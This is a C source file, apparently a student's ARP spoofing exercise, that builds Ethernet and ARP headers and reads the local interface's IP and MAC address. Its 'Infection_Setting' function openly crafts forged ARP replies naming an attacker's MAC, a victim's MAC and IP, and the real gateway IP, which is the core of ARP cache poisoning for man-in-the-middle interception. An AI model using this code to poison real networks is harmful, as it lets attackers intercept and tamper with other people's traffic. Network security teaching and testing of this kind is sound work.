#include "header.h"

void default_setting(Ethernet_Header *eth, ARP_Header *arp){
    eth->type=htons(0x0806); //Next layer will be ARP
    arp->H_type=htons(0x0001);
    arp->P_type=htons(0x0800);
    arp->H_A_length=0x06;
    arp->P_A_length=0x04;
}


void set_eth_mac(Ethernet_Header* eth, uint8_t* Source_mac, uint8_t* Dest_mac){
    memcpy(eth->S_addr, Source_mac, 6);
    memcpy(eth->D_addr, Dest_mac, 6);
}
void set_arp_mac(ARP_Header* arp, uint8_t* Sender_mac, uint8_t* Dest_mac){
    memcpy(arp->S_H_addr, Sender_mac, 6);
    memcpy(arp->D_H_addr, Dest_mac, 6);
}
void set_arp_IP(ARP_Header* arp, uint8_t* Sender_IP, uint8_t* Dest_IP){
    memcpy(arp->D_P_addr, Dest_IP, 4);
    memcpy(arp->S_P_addr, Sender_IP, 4);
}
void set_arp_OP(ARP_Header* arp, int input){
    if(input==REQUEST) arp->OPcode=htons(REQUEST);
    else if(input==REPLY) arp->OPcode=htons(REPLY);
}
void Broadcast_Setting(Ethernet_Header* eth, ARP_Header* arp, uint8_t* S_MAC, uint8_t* S_IP, uint8_t* D_IP){
    set_arp_OP(arp, REQUEST);
    uint8_t temp_broadcast_mac1[6];
    uint8_t temp_broadcast_mac2[6];
    memset(temp_broadcast_mac1, 0xff, 6);
    memset(temp_broadcast_mac2, 0x00, 6);
    set_eth_mac(eth, S_MAC, temp_broadcast_mac1);
    set_arp_mac(arp, S_MAC, temp_broadcast_mac2);
    set_arp_IP(arp, S_IP, D_IP);
}

void Infection_Setting(Ethernet_Header *eth, ARP_Header* arp, uint8_t* attacker_MAC, uint8_t* victim_MAC, uint8_t* victim_IP, uint8_t* Real_IP){
    set_arp_OP(arp, REPLY);
    set_eth_mac(eth, attacker_MAC, victim_MAC);
    set_arp_mac(arp, attacker_MAC, victim_MAC);
    set_arp_IP(arp, Real_IP, victim_IP);
}


void GET_MY_IP_MAC(char * dev, uint8_t * ip_attacker, uint8_t * mac_attacker)
{
    //dev==interface input
    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr); // ???????

    close(fd);
    memcpy(ip_attacker, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);
/*************************************************************************************************/

    // MAC 주소 가져오는 부분인데 공부 해야 할듯. 이해 불가

    /*        Get my Mac Address      */
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    ifreq* it = ifc.ifc_req;
    const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
      strcpy(ifr.ifr_name, it->ifr_name);
      if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
      {
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) // don't count loopback
              {
                      if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                      {
                              success = true;
                              break;
                      }
              }
      }
      else { /* handle error */ }
    }
    if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
}
